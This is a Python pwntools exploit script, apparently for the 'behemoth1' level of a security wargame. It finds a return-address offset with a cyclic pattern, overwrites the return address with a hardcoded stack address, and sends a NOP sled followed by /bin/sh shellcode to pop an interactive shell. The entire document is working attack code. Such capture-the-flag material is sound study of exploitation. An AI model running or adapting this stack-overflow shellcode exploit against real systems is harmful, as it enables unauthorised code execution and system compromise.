from pwn import *

io = gdb.debug('./behemoth1', '''
break *main+50
''') # breaking in ret of main

binary = ELF('./behemoth1')

# Overflow the buffer with a cyclic pattern to make it easy to find offsets
def send_cyclic_line(size, io_object):
    pattern = cyclic(size)
    io_object.sendline(pattern)
    pause()

# Return the size of pattern to overflow the value
def find_overwrite_by_cyclyc_value(value):
    return len(find_cyclic_address(value))
    
# Return the cyclyc pattern until overflow value
def find_cyclic_address(value):
    return cyclic(cyclic_find(value))

def find_assembly(assembly_instructions):
    instrunction = asm(assembly_instructions)
    instrunction = binary.search(instrunction).next()
    log.info("Found {} at 0x{:02x}".format(assembly_instructions, instrunction))
    return instrunction
    
def get_sh_shellcode():
    return asm(shellcraft.sh())


#send_cyclic_line(512) # to overflow and get eip value after ->
log.info("EIP overwrite after %d chars!" % find_overwrite_by_cyclyc_value(0x61617361))

#call_eax = find_assembly('call eax')
nop_sleed = p32(0xffffd1ac)

overflow_until_ret = find_cyclic_address(0x61617361)
nops = asm(shellcraft.nop() * 100)
ret = nop_sleed
sh_shellcode = get_sh_shellcode()

exploit = overflow_until_ret
exploit += ret
exploit += nops
exploit += sh_shellcode

io.sendline(exploit)
log.info("Check return value!")
pause()
io.interactive()
